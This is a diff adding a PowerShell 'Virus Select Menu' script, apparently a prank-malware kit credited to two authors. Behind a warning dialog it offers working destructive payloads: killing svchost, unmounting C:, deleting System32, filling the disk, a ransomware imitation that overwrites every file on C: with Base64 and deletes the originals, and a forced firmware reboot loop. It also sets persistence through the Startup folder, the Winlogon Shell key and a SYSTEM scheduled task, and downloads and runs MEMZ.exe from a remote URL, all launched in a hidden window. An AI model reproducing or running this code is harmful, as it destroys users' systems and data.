@@ -1,0 +1,313 @@
+# Yeni bir gizli PowerShell işlemi başlat
+$scriptBlock = {
+    # Gerekli assembly'leri yükle
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+    [System.Windows.Forms.Application]::EnableVisualStyles()
+
+    # Başlangıçta ses efekti (bip sesi)
+    for ($i = 0; $i -lt 5; $i++) {
+        [Console]::Beep(1000, 200)
+        Start-Sleep -Milliseconds 100
+    }
+
+    # Gelişmiş uyarı MessageBox
+    $warningForm = New-Object System.Windows.Forms.Form
+    $warningForm.Text = "WARNING!!!"
+    $warningForm.Size = New-Object System.Drawing.Size(450, 300)
+    $warningForm.StartPosition = "CenterScreen"
+    $warningForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
+    $warningForm.MaximizeBox = $false
+    $warningForm.MinimizeBox = $false
+    $warningForm.BackColor = [System.Drawing.Color]::DarkRed
+    $warningForm.ForeColor = [System.Drawing.Color]::White
+
+    # Uyarı mesajı
+    $warningLabel = New-Object System.Windows.Forms.Label
+    $warningLabel.Text = "THIS IS DANGEROUS! DO NOT RUN ON A REAL PC!`nWE ARE NOT RESPONSIBLE FOR ANY DAMAGE.`nCHECK 'I DO ACCEPT' AND PRESS OK TO PROCEED."
+    $warningLabel.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
+    $warningLabel.AutoSize = $true
+    $warningLabel.Location = New-Object System.Drawing.Point(20, 20)
+    $warningForm.Controls.Add($warningLabel)
+
+    # Checkbox
+    $acceptCheckBox = New-Object System.Windows.Forms.CheckBox
+    $acceptCheckBox.Text = "I DO ACCEPT"
+    $acceptCheckBox.Location = New-Object System.Drawing.Point(20, 150)
+    $acceptCheckBox.AutoSize = $true
+    $acceptCheckBox.ForeColor = [System.Drawing.Color]::Yellow
+    $warningForm.Controls.Add($acceptCheckBox)
+
+    # OK Butonu
+    $okButtonWarning = New-Object System.Windows.Forms.Button
+    $okButtonWarning.Location = New-Object System.Drawing.Point(120, 200)
+    $okButtonWarning.Size = New-Object System.Drawing.Size(100, 40)
+    $okButtonWarning.Text = "OK"
+    $okButtonWarning.BackColor = [System.Drawing.Color]::Green
+    $okButtonWarning.Enabled = $false
+    $warningForm.Controls.Add($okButtonWarning)
+
+    # Cancel Butonu
+    $cancelButton = New-Object System.Windows.Forms.Button
+    $cancelButton.Location = New-Object System.Drawing.Point(240, 200)
+    $cancelButton.Size = New-Object System.Drawing.Size(100, 40)
+    $cancelButton.Text = "CANCEL"
+    $cancelButton.BackColor = [System.Drawing.Color]::Gray
+    $warningForm.Controls.Add($cancelButton)
+
+    # Checkbox değiştiğinde OK butonunu kontrol et
+    $acceptCheckBox.Add_CheckedChanged({
+        $okButtonWarning.Enabled = $acceptCheckBox.Checked
+    })
+
+    # OK butonuna tıklama
+    $okButtonWarning.Add_Click({
+        $warningForm.DialogResult = [System.Windows.Forms.DialogResult]::OK
+        $warningForm.Close()
+    })
+
+    # Cancel butonuna tıklama
+    $cancelButton.Add_Click({
+        $warningForm.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
+        $warningForm.Close()
+    })
+
+    # Formu göster ve sonucu kontrol et
+    $result = $warningForm.ShowDialog()
+    if ($result -eq [System.Windows.Forms.DialogResult]::Cancel) {
+        [System.Windows.Forms.MessageBox]::Show("Wise choice! Aborting now.", "Aborted", "OK", "Information")
+        exit
+    }
+
+    # BlockInput ve fare kontrolü için API tanımlamaları
+    Add-Type -TypeDefinition @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class InputBlocker {
+        [DllImport("user32.dll")]
+        public static extern bool BlockInput(bool fBlockIt);
+
+        [DllImport("user32.dll")]
+        public static extern bool SetCursorPos(int x, int y);
+
+        [DllImport("user32.dll")]
+        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);
+    }
+"@
+
+    # Ses kontrolü için API tanımlaması
+    Add-Type -TypeDefinition @"
+    using System.Runtime.InteropServices;
+    public class Audio {
+        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
+    }
+"@
+
+    # GUI oluşturma
+    $form = New-Object System.Windows.Forms.Form
+    $form.Text = "Virus Select Menu"
+    $form.Size = New-Object System.Drawing.Size(300,350)
+    $form.StartPosition = "CenterScreen"
+    $form.MaximizeBox = $false
+    $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedSingle
+    $form.BackColor = [System.Drawing.Color]::White
+
+    # ListBox oluşturma
+    $listBox = New-Object System.Windows.Forms.ListBox
+    $listBox.Location = New-Object System.Drawing.Point(10,10)
+    $listBox.Size = New-Object System.Drawing.Size(260,200)
+    $listBox.SelectionMode = "One"
+    $listBox.BackColor = [System.Drawing.Color]::White
+    $listBox.ForeColor = [System.Drawing.Color]::Black
+    $listBox.Items.Add("Blue Screen")
+    $listBox.Items.Add("Mountvol C:")
+    $listBox.Items.Add("Test MsgBox")
+    $listBox.Items.Add("Shutdown Pc")
+    $listBox.Items.Add("Good Bye Pc :D")
+    $listBox.Items.Add("Spam TXT")
+    $listBox.Items.Add("Delete System32!")
+    $listBox.Items.Add("WannaCry But Bad")
+    $listBox.Items.Add("Sigma Boy Virus🗿")
+    $listBox.Items.Add("Original Memz Trojan")
+    $listBox.Items.Add("BIOS Loop")
+    $form.Controls.Add($listBox)
+
+    # OK Butonu
+    $okButton = New-Object System.Windows.Forms.Button
+    $okButton.Location = New-Object System.Drawing.Point(10,220)
+    $okButton.Size = New-Object System.Drawing.Size(75,30)
+    $okButton.Text = "Execute"
+    $okButton.BackColor = [System.Drawing.Color]::White
+    $okButton.ForeColor = [System.Drawing.Color]::Black
+    $form.Controls.Add($okButton)
+
+    # Credits Label
+    $creditsLabel = New-Object System.Windows.Forms.Label
+    $creditsLabel.Text = "Credits: Aras and Baris"
+    $creditsLabel.AutoSize = $true
+    $creditsLabel.Location = New-Object System.Drawing.Point(150, 290)
+    $creditsLabel.ForeColor = [System.Drawing.Color]::Black
+    $form.Controls.Add($creditsLabel)
+
+    # OK butonuna tıklama olayı
+    $okButton.Add_Click({
+        $selectedItem = $listBox.SelectedItem
+        if ($selectedItem) {
+            switch ($selectedItem) {
+                "Blue Screen" {
+                    Start-Process -FilePath "cmd.exe" -ArgumentList "/c taskkill /f /im svchost.exe" -NoNewWindow -Wait
+                }
+                "Mountvol C:" {
+                    Start-Process -FilePath "cmd.exe" -ArgumentList "/c mountvol C: /d" -NoNewWindow -Wait
+                }
+                "Test MsgBox" {
+                    [System.Windows.Forms.MessageBox]::Show("TEST SUCCESSFUL!", "Test", "OK", "Information")
+                }
+                "Shutdown Pc" {
+                    Start-Process -FilePath "cmd.exe" -ArgumentList "/c shutdown -s -t 00" -NoNewWindow -Wait
+                }
+                "Good Bye Pc :D" {
+                    $result = [System.Windows.Forms.MessageBox]::Show(
+                        "PC will restart on boot! Sure?",
+                        "WARNING!",
+                        "OKCancel",
+                        "Warning"
+                    )
+                    if ($result -eq "OK") {
+                        $batContent = @"
+@echo off
+copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\sa.bat"
+shutdown -r -t 00
+"@
+                        $batPath = "$($env:TEMP)\sa.bat"
+                        Set-Content -Path $batPath -Value $batContent -Encoding ASCII
+                        Start-Process -FilePath $batPath -NoNewWindow
+                    }
+                }
+                "Spam TXT" {
+                    while ($true) {
+                        $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
+                        $filePath = "C:\${randomName}.txt"
+                        $sizeInBytes = 10MB
+                        $content = -join ((33..126) | Get-Random -Count $sizeInBytes | % {[char]$_})
+                        [System.IO.File]::WriteAllText($filePath, $content)
+                        Start-Sleep -Milliseconds 100
+                    }
+                }
+                "Delete System32!" {
+                    $result = [System.Windows.Forms.MessageBox]::Show(
+                        "THIS WILL DESTROY YOUR SYSTEM! SURE?",
+                        "DANGER!",
+                        "OKCancel",
+                        "Error"
+                    )
+                    if ($result -eq "OK") {
+                        $system32Path = "C:\Windows\System32"
+                        Start-Process -FilePath "cmd.exe" -ArgumentList "/c takeown /f $system32Path /r /d y && icacls $system32Path /grant administrators:F /t" -NoNewWindow -Wait
+                        Remove-Item -Path $system32Path -Recurse -Force -ErrorAction SilentlyContinue
+                    }
+                }
+                "WannaCry But Bad" {
+                    $result = [System.Windows.Forms.MessageBox]::Show(
+                        "ALL FILES WILL BE ENCRYPTED! NO WAY BACK! SURE?",
+                        "WannaCry Simulation",
+                        "OKCancel",
+                        "Error"
+                    )
+                    if ($result -eq "OK") {
+                        $files = Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue
+                        $encryptionKey = "WannaCrySimulationKey123"
+                        foreach ($file in $files) {
+                            $content = [System.IO.File]::ReadAllBytes($file.FullName)
+                            $encryptedContent = [Convert]::ToBase64String($content)
+                            $newFileName = $file.FullName + ".djashdk"
+                            [System.IO.File]::WriteAllText($newFileName, $encryptedContent)
+                            Remove-Item -Path $file.FullName -Force -ErrorAction SilentlyContinue
+                        }
+                        $ransomNote = @"
+Your files are GONE! WannaCry Simulation complete.
+Send 1 BTC to: [FakeAddress]
+"@
+                        Set-Content -Path "C:\README.txt" -Value $ransomNote -Force
+                    }
+                }
+                "Sigma Boy Virus🗿" {
+                    $form.Close()
+                    [InputBlocker]::BlockInput($true)
+                    $scriptPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\prank.ps1"
+                    Copy-Item -Path $PSCommandPath -Destination $scriptPath -Force
+                    for ($i = 0; $i -lt 50; $i++) {
+                        [Audio]::keybd_event(0xAF, 0, 0, 0)
+                        Start-Sleep -Milliseconds 10
+                    }
+                    $videoUrl = "https://www.yout-ube.com/watch?v=_z2RvL2s5rQ"
+                    Start-Process "msedge" -ArgumentList "--kiosk $videoUrl"
+                    Start-Sleep -Seconds 5
+                    $screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
+                    $screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
+                    $clickX = [math]::Floor($screenWidth / 2)
+                    $clickY = [math]::Floor($screenHeight / 2)
+                    [InputBlocker]::SetCursorPos($clickX, $clickY)
+                    [InputBlocker]::mouse_event(0x0002, 0, 0, 0, 0)
+                    Start-Sleep -Milliseconds 100
+                    [InputBlocker]::mouse_event(0x0004, 0, 0, 0, 0)
+                    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+                    Set-ItemProperty -Path $regPath -Name "Shell" -Value "powershell.exe -ExecutionPolicy Bypass -File $scriptPath" -Force
+                    while ($true) { Start-Sleep -Seconds 1 }
+                }
+                "Original Memz Trojan" {
+                    $form.Close()
+                    $memzUrl = "https://github.com/RobloxScripts490/Vir-s/raw/refs/heads/main/MEMZ.exe"
+                    $memzPath = "$($env:TEMP)\MEMZ.exe"
+                    try {
+                        Invoke-WebRequest -Uri $memzUrl -OutFile $memzPath -ErrorAction Stop
+                        Start-Process -FilePath $memzPath -NoNewWindow
+                    } catch {
+                        [System.Windows.Forms.MessageBox]::Show(
+                            "MEMZ DOWNLOAD FAILED! CHECK CONNECTION!",
+                            "Error",
+                            "OK",
+                            "Error"
+                        )
+                    }
+                }
+                "BIOS Loop" {
+                    $result = [System.Windows.Forms.MessageBox]::Show(
+                        "This will force a BIOS reboot loop! Sure?",
+                        "BIOS Loop Warning",
+                        "OKCancel",
+                        "Warning"
+                    )
+                    if ($result -eq "OK") {
+                        # Görev Zamanlayıcı ile otomatik yönetici çalıştırma
+                        $taskName = "BIOSLoopTask"
+                        $scriptPath = "$env:TEMP\biosloop.ps1"
+                        $taskScript = @"
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c shutdown /r /fw /t 1" -NoNewWindow
+"@
+                        Set-Content -Path $scriptPath -Value $taskScript -Force
+
+                        # Görev oluştur (yönetici izni istemeden çalışır)
+                        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File $scriptPath"
+                        $trigger = New-ScheduledTaskTrigger -AtStartup
+                        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 0)
+                        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+                        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force
+
+                        # İlk çalıştırma
+                        Start-Process -FilePath "cmd.exe" -ArgumentList "/c shutdown /r /fw /t 1" -NoNewWindow
+                    }
+                }
+            }
+        }
+    })
+
+    # Formu göster
+    $form.ShowDialog()
+}
+
+# Script bloğunu bir dosyaya kaydet ve gizli çalıştır
+$scriptPath = "$($env:TEMP)\hidden_script.ps1"
+$scriptBlock | Out-File -FilePath $scriptPath -Encoding UTF8
+Start-Process powershell -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -NoNewWindow
